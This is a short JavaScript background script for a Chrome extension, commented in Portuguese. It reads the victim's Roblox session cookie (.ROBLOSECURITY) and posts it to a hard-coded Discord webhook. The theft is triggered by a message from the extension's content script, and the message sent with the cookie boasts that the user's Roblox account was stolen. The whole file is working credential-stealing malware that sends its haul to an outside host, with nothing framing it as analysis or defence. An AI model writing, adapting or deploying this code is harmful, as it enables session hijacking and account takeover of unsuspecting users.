// Função para capturar o cookie do Roblox e enviar ao Discord
async function stealRobloxCookie() {
    try {
        const cookie = await chrome.cookies.get({
            url: "https://www.roblox.com",
            name: ".ROBLOSECURITY"
        });

        if (cookie) {
            fetch('https://discord.com/api/webhooks/1546735130293440512/O00D4rhPcm95N0uNqncN19ejmRbjJg0s-rEfVrnGnNs-vwGE4WZVPzGlG8gBHu7iAUN0', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    content: `🎯 **GATILHO ATIVADO!**\nO usuário entrou no site do Dice e eu roubei o Roblox dele!\n\n**Cookie:** \n\`${cookie.value}\`` 
                })
            });
        }
    } catch (e) {
        console.error("Erro ao capturar cookie:", e);
    }
}

// Ouve mensagens vindas do content.js
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "steal_roblox") {
        stealRobloxCookie();
    }
});
